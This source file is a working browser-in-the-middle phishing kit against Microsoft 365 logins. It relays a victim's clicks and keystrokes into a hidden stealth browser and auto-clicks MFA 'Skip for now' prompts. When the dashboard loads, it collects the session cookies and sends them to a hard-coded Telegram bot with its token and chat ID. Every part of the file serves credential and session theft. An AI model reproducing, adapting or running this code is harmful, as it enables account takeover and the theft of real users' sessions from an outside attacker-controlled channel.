const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

async function sendExfiltrationAlert(data) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const message = `🚀 *SESSION CAPTURED*\n\n*Target:* Microsoft 365\n*Status:* Successful Bypass & Cookie Extraction`;
    try {
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' });
        await axios.post(url, { 
            chat_id: CHAT_ID, 
            text: `\`\`\`json\n${JSON.stringify(data, null, 2).substring(0, 4000)}\n\`\`\``,
            parse_mode: 'Markdown'
        });
    } catch (error) { console.error('[!] Telegram error:', error.message); }
}

async function startSession(io, socket) {
    console.log(`[INIT] Starting bypass-hardened session: ${socket.id}`);
    let browser;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--single-process'
            ]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });

        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 35 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        console.log(`[NAV] Directing to Microsoft...`);
        page.goto('https://login.microsoftonline.com/', { waitUntil: 'domcontentloaded' }).catch(() => {});

        // HEARTBEAT: Standard visual sync
        const heartbeat = setInterval(emitFrame, 1200);

        /**
         * AUTO-BYPASS LOGIC
         * Periodically scans for hidden or unresponsive "Skip" buttons 
         * that block progress to the dashboard.
         */
        const bypassInterval = setInterval(async () => {
            if (!socket.connected) return clearInterval(bypassInterval);
            try {
                // List of common selectors for Microsoft's "Skip" and "Next" buttons
                const selectors = [
                    '#iShowSkip', 
                    '#iNext', 
                    'input[value="Skip for now"]', 
                    'input[value="Next"]',
                    'input[type="button"][id="idSubmit_SAOTCC_Continue"]'
                ];

                for (const selector of selectors) {
                    const btn = await page.$(selector);
                    if (btn) {
                        console.log(`[AUTO-BYPASS] Found and clicking: ${selector}`);
                        await btn.click();
                        await emitFrame();
                    }
                }
            } catch (e) {}
        }, 3000);

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') await page.mouse.click(data.x, data.y);
                else if (data.type === 'key') await page.keyboard.press(data.key);
                await emitFrame();
            } catch (err) { console.error('[ACTION-ERR]', err.message); }
        });

        // SUCCESS SENSOR: Detects when we hit the Office dashboard
        page.on('framenavigated', async (frame) => {
            const url = frame.url();
            if (url.includes('shell/homepage') || url.includes('office.com')) {
                console.log(`[SUCCESS] Destination reached: ${url}`);
                const cookies = await page.cookies();
                await sendExfiltrationAlert(cookies);
                socket.emit('success');
            }
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            clearInterval(bypassInterval);
            if (browser) await browser.close();
        });

    } catch (error) {
        console.error('[FATAL]', error.message);
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
